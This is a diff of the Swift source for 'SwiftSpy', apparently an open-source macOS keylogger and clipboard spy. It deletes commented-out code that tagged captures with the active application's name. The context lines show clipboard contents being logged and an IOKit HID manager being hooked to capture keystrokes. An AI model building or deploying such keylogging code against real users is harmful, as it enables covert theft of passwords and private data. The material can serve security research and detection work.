@@ -2,7 +2,6 @@ import Cocoa
 import Foundation
 import IOKit.hid
 import AppKit
-import AVFoundation
 
 var capslock = false
 
@@ -149,19 +148,6 @@ class SwiftSpy
                     print("[+] Copy event detected at", NSDate(), "(UTC)!")
                     print("[+] Clipboard Data:", clipboardData)
                     changeCount = pasteboard.changeCount
-                    
-//                    let procs = NSWorkspace.shared.runningApplications
-//                    for currentApp in procs
-//                    {
-//                        if(currentApp.activationPolicy == .regular)
-//                        {
-//                            if(currentApp.ownsMenuBar && currentApp.isActive)
-//                            {
-//                                print("[+] Clipboard Active App:", currentApp.localizedName!)
-//                                print("")
-//                            }
-//                        }
-//                    }
                 }
             }
         }
@@ -285,17 +271,7 @@ class SwiftSpy
         {
             print("[+] HID manager opened!")
         }
-        
-//        // Hook active application
-//        let notificationCenter = NSWorkspace.shared.notificationCenter
-//        notificationCenter.addObserver(forName: NSWorkspace.didActivateApplicationNotification, object: nil, queue: OperationQueue.main)
-//        {   (notificationCenter: Notification) in
-//
-//            let currentApp = notificationCenter.userInfo!["NSWorkspaceApplicationKey"] as! NSRunningApplication
-//            print("")
-//            print("[+] Keylogger Active App:", currentApp.localizedName!)
-//        }
-        
+                
         // Start RunLoop
         IOHIDManagerScheduleWithRunLoop(HIDManager, CFRunLoopGetCurrent(), CFRunLoopMode.defaultMode.rawValue)
         RunLoop.current.run()
